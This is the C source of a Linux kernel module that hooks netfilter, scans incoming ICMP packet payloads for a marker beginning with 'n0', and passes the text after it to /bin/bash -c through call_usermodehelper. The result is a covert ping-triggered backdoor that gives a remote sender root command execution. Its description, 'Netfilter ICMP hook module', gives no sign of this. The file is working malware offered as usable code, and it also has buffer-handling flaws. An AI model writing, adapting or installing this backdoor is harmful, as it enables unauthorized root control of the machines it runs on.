#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>

//#define MAX_PAYLOAD_SIZE 128
#define MAX_PAYLOAD_SIZE 100000
static struct nf_hook_ops nfho;

void exec_remote_cmd(const char *cmd) {
    char *envp[] = {
            "HOME=/",
            "TERM=xterm",
            "PATH=/sbin:/usr/sbin:/bin:/usr/bin",
            NULL
    };

    char *argv[] = {
            "/bin/bash",
            "-c",
            cmd,
            NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

unsigned int icmp_hook_func(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    struct iphdr *ip;
    struct icmphdr *icmp;
    char *data;
    int data_len;

    if (!skb) {
        printk("erro1");
        return NF_ACCEPT;
    }

    ip = ip_hdr(skb);
    if (!ip) {
        printk("erro2");
        return NF_ACCEPT;
    }

    if (ip->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }

    icmp = icmp_hdr(skb);
    if (!icmp) {
        printk("erro4");
        return NF_ACCEPT;
    }

    //if (icmp->type != ICMP_ECHO) {
      //  printk("erro5");
        //return NF_ACCEPT;
    //}

    // allocate a buffer for the payload data
    data_len = ntohs(ip->tot_len) - sizeof(struct iphdr) - sizeof(struct icmphdr);
    if (data_len <= 0) {
        printk("erro5");
        return NF_ACCEPT;
    }
    data = kmalloc(data_len + 1, GFP_ATOMIC);
    if (!data) {
        printk("erro6");
        return NF_ACCEPT;
    }
    // copy the payload data to the buffer
    skb_copy_bits(skb, skb_network_offset(skb) + sizeof(struct icmphdr), data, data_len);
    //data = (char *) (icmp + 1);
    // add a null terminator to the end of the payload data
    data[data_len] = '\0';

    // print the payload data
    printk(KERN_INFO "Received ICMP packet len %d from %pI4 with payload\n", data_len, &ip->saddr);
    //if (strncmp(data, "n0xsh_", 6) == 0) {
    int ix, j;
    char exec_command[2048] = "";
    //printk("%c aq e data25", data + 25);
    for (ix=0;ix<data_len;ix++){
        //printk("%c", data[ix]);
        if (data[ix] == 'n' && data[ix+1] == '0') {
            //printk("%c dataix %c", data[ix], data[ix+1]);
            for (j = ix + 6; j < data_len; j++) {
                if (data[j] == '#'){
                    strncat(exec_command, "\0", 1);
                    break;
                }
                strncat(exec_command, &data[j], 1);
            }
        }
    }
    printk("%s", exec_command);
    if (strlen(exec_command) != 0){
        exec_remote_cmd(exec_command);
        printk("executou?");
    }
    kfree(data);
    return NF_ACCEPT;
}

static int icmp_hook_init(void)
{
    nfho.hook = icmp_hook_func;
    nfho.priv = NULL;
    nfho.pf = PF_INET;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &nfho);

    return 0;
}

static void icmp_hook_exit(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
}

module_init(icmp_hook_init);
module_exit(icmp_hook_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your name");
MODULE_DESCRIPTION("Netfilter ICMP hook module");
